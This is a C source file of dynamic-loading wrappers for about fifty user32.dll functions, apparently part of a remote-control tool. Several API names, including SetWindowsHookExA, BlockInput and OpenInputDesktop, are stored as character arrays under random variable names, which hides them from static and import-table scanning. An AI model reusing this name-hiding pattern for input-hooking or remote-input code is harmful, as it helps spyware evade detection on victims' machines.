#include <windows.h>
#include "API_user32.h"
#include "GetProcAddressEx.h"



BOOL
API_GetInputState(
				void
				)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(void);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"GetInputState"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun();      //调用函数
	}
	return ret;
}

BOOL API_PostThreadMessageA(
    IN DWORD idThread,
    IN UINT Msg,
    IN WPARAM wParam,
    IN LPARAM lParam)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(DWORD,UINT,WPARAM,LPARAM);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"PostThreadMessageA"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(idThread,Msg,wParam,lParam);      //调用函数
	}
	return ret;
}

BOOL
API_PostThreadMessageW(
				DWORD idThread,
				UINT Msg,
				WPARAM wParam,
				LPARAM IParam
				)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(DWORD,UINT,WPARAM,LPARAM);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"PostThreadMessageW"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(idThread,Msg,wParam,IParam);      //调用函数
	}
	return ret;
}

BOOL API_GetMessageA(
    OUT LPMSG lpMsg,
    IN HWND hWnd,
    IN UINT wMsgFilterMin,
    IN UINT wMsgFilterMax)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(LPMSG,HWND,UINT,UINT);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"GetMessageA"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(lpMsg,hWnd,wMsgFilterMin,wMsgFilterMax);      //调用函数
	}
	return ret;
}

BOOL
API_GetMessageW(
				LPMSG lpMsg,
				HWND hWnd,
				UINT wMsgFilterMin,
				UINT wMsgFilteMax
				)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(LPMSG,HWND,UINT,UINT);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"GetMessageW"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(lpMsg,hWnd,wMsgFilterMin,wMsgFilteMax);      //调用函数
	}
	return ret;
}

HHOOK API_SetWindowsHookExW(	int idHook,
						   HOOKPROC lpfn,
						   HINSTANCE hmod,
						   DWORD dwThreadId)
{
	HHOOK ret = NULL;
	typedef HHOOK (WINAPI *lpAddFun)(int,HOOKPROC,HINSTANCE,DWORD);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"SetWindowsHookExW"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(idHook,lpfn,hmod,dwThreadId);      //调用函数
	}
	return ret;
}

char AGCyG[] = {'E','x','i','t','W','i','n','d','o','w','s','E','x','\0'};
BOOL API_ExitWindowsEx(
			  UINT uFlags,
			  DWORD dwReason)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(UINT,DWORD);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,AGCyG); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(uFlags,dwReason);      //调用函数
	}
	return ret;
}

LRESULT
API_CallNextHookEx(
			   HHOOK hhk,
			   int nCode,
			   WPARAM wParam,
			   LPARAM lParam)
{
	LRESULT ret = NULL;
	typedef BOOL (WINAPI *lpAddFun)(HHOOK,int,WPARAM,LPARAM);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"CallNextHookEx"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hhk,nCode,wParam,lParam);      //调用函数
	}
	return ret;
}


char RmDTg[] = {'S','e','t','W','i','n','d','o','w','s','H','o','o','k','E','x','A','\0'};
HHOOK
WINAPI
API_SetWindowsHookExA(
    IN int idHook,
    IN HOOKPROC lpfn,
    IN HINSTANCE hmod,
    IN DWORD dwThreadId)
{
	HHOOK ret = NULL;
	typedef HHOOK (WINAPI *lpAddFun)(int,HOOKPROC,HINSTANCE,DWORD);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,RmDTg); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(idHook,lpfn,hmod,dwThreadId);      //调用函数
	}
	return ret;
}


char viDcN[] = {'U','n','h','o','o','k','W','i','n','d','o','w','s','H','o','o','k','E','x','\0'};
BOOL
WINAPI
API_UnhookWindowsHookEx(
    IN HHOOK hhk)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(HHOOK);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,viDcN); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hhk);      //调用函数
	}
	return ret;
}


char YgSdD[] = {'M','a','p','V','i','r','t','u','a','l','K','e','y','A','\0'};
UINT
WINAPI
API_MapVirtualKeyA(
    IN UINT uCode,
    IN UINT uMapType)
{
	UINT ret = FALSE;
	typedef UINT (WINAPI *lpAddFun)(UINT,UINT);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,YgSdD); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(uCode,uMapType);      //调用函数
	}
	return ret;
}


char VIWXq[] = {'G','e','t','K','e','y','N','a','m','e','T','e','x','t','A','\0'};
int
WINAPI
API_GetKeyNameTextA(
    IN LONG lParam,
    OUT LPSTR lpString,
    IN int nSize
    )
{
	int ret = FALSE;
	typedef int (WINAPI *lpAddFun)(LONG,LPSTR,int);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,VIWXq); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(lParam,lpString,nSize);      //调用函数
	}
	return ret;
}


char AImJB[] = {'S','e','t','C','u','r','s','o','r','P','o','s','\0'};
BOOL
WINAPI
API_SetCursorPos(
    IN int X,
    IN int Y)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(int,int);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,AImJB); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(X,Y);      //调用函数
	}
	return ret;
}


char bmHEm[] = {'S','e','t','C','a','p','t','u','r','e','\0'};
HWND
WINAPI
API_SetCapture(
    IN HWND hWnd)
{
	HWND ret = FALSE;
	typedef HWND (WINAPI *lpAddFun)(HWND);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,bmHEm); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hWnd);      //调用函数
	}
	return ret;
}


char RfKVn[] = {'m','o','u','s','e','_','e','v','e','n','t','\0'};
VOID
WINAPI
API_mouse_event(
    IN DWORD dwFlags,
    IN DWORD dx,
    IN DWORD dy,
    IN DWORD dwData,
    IN ULONG_PTR dwExtraInfo)
{
	typedef VOID (WINAPI *lpAddFun)(DWORD,DWORD,DWORD,DWORD,ULONG_PTR);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,RfKVn); //函数名字
	if (addFun != NULL)
	{
		addFun(dwFlags,dx,dy,dwData,dwExtraInfo);      //调用函数
	}
	return;
}

VOID
WINAPI
API_keybd_event(
    IN BYTE bVk,
    IN BYTE bScan,
    IN DWORD dwFlags,
    IN ULONG_PTR dwExtraInfo)
{
	typedef VOID (WINAPI *lpAddFun)(BYTE,BYTE,DWORD,ULONG_PTR);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"keybd_event"); //函数名字
	if (addFun != NULL)
	{
		addFun(bVk,bScan,dwFlags,dwExtraInfo);      //调用函数
	}
	return;
}

HWINSTA
WINAPI
API_GetProcessWindowStation(
    VOID)
{
	HWINSTA ret = FALSE;
	typedef HWINSTA (WINAPI *lpAddFun)(VOID);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"GetProcessWindowStation"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun();      //调用函数
	}
	return ret;
}

HWINSTA
WINAPI
API_OpenWindowStationA(
    IN LPCSTR lpszWinSta,
    IN BOOL fInherit,
    IN ACCESS_MASK dwDesiredAccess)
{
	HWINSTA ret = FALSE;
	typedef HWINSTA (WINAPI *lpAddFun)(LPCSTR,BOOL,ACCESS_MASK);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"OpenWindowStationA"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(lpszWinSta,fInherit,dwDesiredAccess);      //调用函数
	}
	return ret;
}

BOOL
WINAPI
API_SetProcessWindowStation(
    IN HWINSTA hWinSta)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(HWINSTA);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"SetProcessWindowStation"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hWinSta);      //调用函数
	}
	return ret;
}


char skgtE[] = {'O','p','e','n','D','e','s','k','t','o','p','A','\0'};
HDESK
WINAPI
API_OpenDesktopA(
    IN LPCSTR lpszDesktop,
    IN DWORD dwFlags,
    IN BOOL fInherit,
    IN ACCESS_MASK dwDesiredAccess)
{
	HDESK ret = FALSE;
	typedef HDESK (WINAPI *lpAddFun)(LPCSTR,DWORD,BOOL,ACCESS_MASK);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,skgtE); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(lpszDesktop,dwFlags,fInherit,dwDesiredAccess);      //调用函数
	}
	return ret;
}


char vjcrT[] = {'O','p','e','n','I','n','p','u','t','D','e','s','k','t','o','p','\0'};
HDESK
WINAPI
API_OpenInputDesktop(
    IN DWORD dwFlags,
    IN BOOL fInherit,
    IN ACCESS_MASK dwDesiredAccess)
{
	HDESK ret = FALSE;
	typedef HDESK (WINAPI *lpAddFun)(DWORD,BOOL,ACCESS_MASK);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,vjcrT); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(dwFlags,fInherit,dwDesiredAccess);      //调用函数
	}
	return ret;
}


char gcJMA[] = {'C','l','o','s','e','D','e','s','k','t','o','p','\0'};
BOOL
WINAPI
API_CloseDesktop(
    IN HDESK hDesktop)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(HDESK);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,gcJMA); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hDesktop);      //调用函数
	}
	return ret;
}


char swkSW[] = {'S','e','t','T','h','r','e','a','d','D','e','s','k','t','o','p','\0'};
BOOL
WINAPI
API_SetThreadDesktop(
    IN HDESK hDesktop)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(HDESK);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,swkSW); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hDesktop);      //调用函数
	}
	return ret;
}


char MgvbU[] = {'G','e','t','W','i','n','d','o','w','T','e','x','t','A','\0'};
int
WINAPI
API_GetWindowTextA(
    IN HWND hWnd,
    OUT LPSTR lpString,
    IN int nMaxCount)
{
	int ret = FALSE;
	typedef int (WINAPI *lpAddFun)(HWND,LPSTR,int);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,MgvbU); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hWnd,lpString,nMaxCount);      //调用函数
	}
	return ret;
}

BOOL
WINAPI
API_IsWindowVisible(
    IN HWND hWnd)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(HWND);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"IsWindowVisible"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hWnd);      //调用函数
	}
	return ret;
}


char pIthp[] = {'G','e','t','W','i','n','d','o','w','T','h','r','e','a','d','P','r','o','c','e','s','s','I','d','\0'};
DWORD
WINAPI
API_GetWindowThreadProcessId(
    IN HWND hWnd,
    OUT LPDWORD lpdwProcessId)
{
	DWORD ret = FALSE;
	typedef DWORD (WINAPI *lpAddFun)(HWND,LPDWORD);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,pIthp); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hWnd,lpdwProcessId);      //调用函数
	}
	return ret;
}

BOOL
WINAPI
API_EnumWindows(
    IN WNDENUMPROC lpEnumFunc,
    IN LPARAM lParam)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(WNDENUMPROC,LPARAM);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"EnumWindows"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(lpEnumFunc,lParam);      //调用函数
	}
	return ret;
}


char gsifE[] = {'G','e','t','S','y','s','t','e','m','M','e','t','r','i','c','s','\0'};
int
WINAPI
API_GetSystemMetrics(
    IN int nIndex)
{
	int ret = FALSE;
	typedef int (WINAPI *lpAddFun)(int);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,gsifE); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(nIndex);      //调用函数
	}
	return ret;
}


char YeFoq[] = {'G','e','t','T','h','r','e','a','d','D','e','s','k','t','o','p','\0'};
HDESK
WINAPI
API_GetThreadDesktop(
    IN DWORD dwThreadId)
{
	HDESK ret = FALSE;
	typedef HDESK (WINAPI *lpAddFun)(DWORD);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,YeFoq); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(dwThreadId);      //调用函数
	}
	return ret;
}


char laRMy[] = {'S','y','s','t','e','m','P','a','r','a','m','e','t','e','r','s','I','n','f','o','A','\0'};
BOOL
WINAPI
API_SystemParametersInfoA(
    IN UINT uiAction,
    IN UINT uiParam,
    IN OUT PVOID pvParam,
    IN UINT fWinIni)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(UINT,UINT,PVOID,UINT);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,laRMy); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(uiAction,uiParam,pvParam,fWinIni);      //调用函数
	}
	return ret;
}


char rbpNr[] = {'S','e','n','d','M','e','s','s','a','g','e','A','\0'};
LRESULT
WINAPI
API_SendMessageA(
    IN HWND hWnd,
    IN UINT Msg,
    IN WPARAM wParam,
    IN LPARAM lParam)
{
	LRESULT ret = FALSE;
	typedef LRESULT (WINAPI *lpAddFun)(HWND,UINT,WPARAM,LPARAM);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,rbpNr); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hWnd,Msg,wParam,lParam);      //调用函数
	}
	return ret;
}


char BwmYB[] = {'B','l','o','c','k','I','n','p','u','t','\0'};
BOOL
WINAPI
API_BlockInput(
    BOOL fBlockIt
)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(BOOL);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,BwmYB); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(fBlockIt);      //调用函数
	}
	return ret;
}


char zPQsf[] = {'G','e','t','D','e','s','k','t','o','p','W','i','n','d','o','w','\0'};
HWND
WINAPI
API_GetDesktopWindow(
    VOID)
{
	HWND ret = FALSE;
	typedef HWND (WINAPI *lpAddFun)(VOID);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,zPQsf); //函数名字
	if (addFun != NULL)
	{
		ret = addFun();      //调用函数
	}
	return ret;
}

HDC
WINAPI
API_GetDC(
    IN HWND hWnd)
{
	HDC ret = FALSE;
	typedef HDC (WINAPI *lpAddFun)(HWND);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"GetDC"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hWnd);      //调用函数
	}
	return ret;
}

int
WINAPI
API_ReleaseDC(
    IN HWND hWnd,
    IN HDC hDC)
{
	int ret = FALSE;
	typedef int (WINAPI *lpAddFun)(HWND,HDC);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"ReleaseDC"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hWnd,hDC);      //调用函数
	}
	return ret;
}


char WquyE[] = {'C','h','a','r','N','e','x','t','A','\0'};
LPSTR
WINAPI
API_CharNextA(
    IN LPCSTR lpsz)
{
	LPSTR ret = FALSE;
	typedef LPSTR (WINAPI *lpAddFun)(LPCSTR);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,WquyE); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(lpsz);      //调用函数
	}
	return ret;
}


char WeiGL[] = {'G','e','t','U','s','e','r','O','b','j','e','c','t','I','n','f','o','r','m','a','t','i','o','n','A','\0'};
BOOL
WINAPI
API_GetUserObjectInformationA(
    IN HANDLE hObj,
    IN int nIndex,
    OUT PVOID pvInfo,
    IN DWORD nLength,
    OUT LPDWORD lpnLengthNeeded)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(HANDLE,int,PVOID,DWORD,LPDWORD);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,WeiGL); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hObj,nIndex,pvInfo,nLength,lpnLengthNeeded);      //调用函数
	}
	return ret;
}


char reYOm[] = {'G','e','t','A','c','t','i','v','e','W','i','n','d','o','w','\0'};
HWND
WINAPI
API_GetActiveWindow(
    VOID)
{
	HWND ret = FALSE;
	typedef HWND (WINAPI *lpAddFun)(VOID);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,reYOm); //函数名字
	if (addFun != NULL)
	{
		ret = addFun();      //调用函数
	}
	return ret;
}


char xtlpk[] = {'W','i','n','d','o','w','F','r','o','m','P','o','i','n','t','\0'};
HWND
WINAPI
API_WindowFromPoint(
    IN POINT Point)
{
	HWND ret = FALSE;
	typedef HWND (WINAPI *lpAddFun)(POINT);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,xtlpk); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(Point);      //调用函数
	}
	return ret;
}


char HxmYP[] = {'G','e','t','C','u','r','s','o','r','P','o','s','\0'};
BOOL
WINAPI
API_GetCursorPos(
    OUT LPPOINT lpPoint)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(LPPOINT);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,HxmYP); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(lpPoint);      //调用函数
	}
	return ret;
}

BOOL
WINAPI
API_SetRect(
    OUT LPRECT lprc,
    IN int xLeft,
    IN int yTop,
    IN int xRight,
    IN int yBottom)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(LPRECT,int,int,int,int);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"SetRect"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(lprc,xLeft,yTop,xRight,yBottom);      //调用函数
	}
	return ret;
}

BOOL
WINAPI
API_PostMessageA(
    IN HWND hWnd,
    IN UINT Msg,
    IN WPARAM wParam,
    IN LPARAM lParam)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(HWND,UINT,WPARAM,LPARAM);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"PostMessageA"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hWnd,Msg,wParam,lParam);      //调用函数
	}
	return ret;
}

BOOL
WINAPI
API_CloseWindow(
    IN HWND hWnd)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(HWND);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"CloseWindow"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hWnd);      //调用函数
	}
	return ret;
}

BOOL
WINAPI
API_TranslateMessage(
    IN CONST MSG *lpMsg)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(CONST MSG *);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"TranslateMessage"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(lpMsg);      //调用函数
	}
	return ret;
}

LRESULT
WINAPI
API_DispatchMessageA(
    IN CONST MSG *lpMsg)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(CONST MSG *);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"DispatchMessageA"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(lpMsg);      //调用函数
	}
	return ret;
}

HANDLE
WINAPI
API_GetClipboardData(
    IN UINT uFormat)
{
	HANDLE ret = FALSE;
	typedef HANDLE (WINAPI *lpAddFun)(UINT);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"GetClipboardData"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(uFormat);      //调用函数
	}
	return ret;
}


char uwhfh[] = {'S','e','t','C','l','i','p','b','o','a','r','d','D','a','t','a','\0'};
HANDLE
WINAPI
API_SetClipboardData(
    IN UINT uFormat,
    IN HANDLE hMem)
{
	HANDLE ret = FALSE;
	typedef HANDLE (WINAPI *lpAddFun)(UINT,HANDLE);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,uwhfh); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(uFormat,hMem);      //调用函数
	}
	return ret;
}


char xObjs[] = {'O','p','e','n','C','l','i','p','b','o','a','r','d','\0'};
BOOL
WINAPI
API_OpenClipboard(
    IN HWND hWndNewOwner)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(HWND);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,xObjs); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(hWndNewOwner);      //调用函数
	}
	return ret;
}


char RbMNu[] = {'E','m','p','t','y','C','l','i','p','b','o','a','r','d','\0'};
BOOL
WINAPI
API_EmptyClipboard(
    VOID)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(VOID);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,RbMNu); //函数名字
	if (addFun != NULL)
	{
		ret = addFun();      //调用函数
	}
	return ret;
}


char kKWou[] = {'C','l','o','s','e','C','l','i','p','b','o','a','r','d','\0'};
BOOL
WINAPI
API_CloseClipboard(
    VOID)
{
	BOOL ret = FALSE;
	typedef BOOL (WINAPI *lpAddFun)(VOID);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,kKWou); //函数名字
	if (addFun != NULL)
	{
		ret = addFun();      //调用函数
	}
	return ret;
}

HWND
WINAPI
API_CreateWindowExA(
    IN DWORD dwExStyle,
    IN LPCSTR lpClassName,
    IN LPCSTR lpWindowName,
    IN DWORD dwStyle,
    IN int X,
    IN int Y,
    IN int nWidth,
    IN int nHeight,
    IN HWND hWndParent,
    IN HMENU hMenu,
    IN HINSTANCE hInstance,
    IN LPVOID lpParam)
{
	HWND ret = FALSE;
	typedef HWND (WINAPI *lpAddFun)(DWORD,LPCSTR,LPCSTR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);    //返回值,形参类型参考函数定义
	HINSTANCE hDll=LoadLibraryW(L"user32.dll");    //函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddressEx(hDll,"CreateWindowExA"); //函数名字
	if (addFun != NULL)
	{
		ret = addFun(dwExStyle,lpClassName,lpWindowName,dwStyle,X,Y,nWidth,nHeight,hWndParent,hMenu,hInstance,lpParam);      //调用函数
	}
	return ret;
}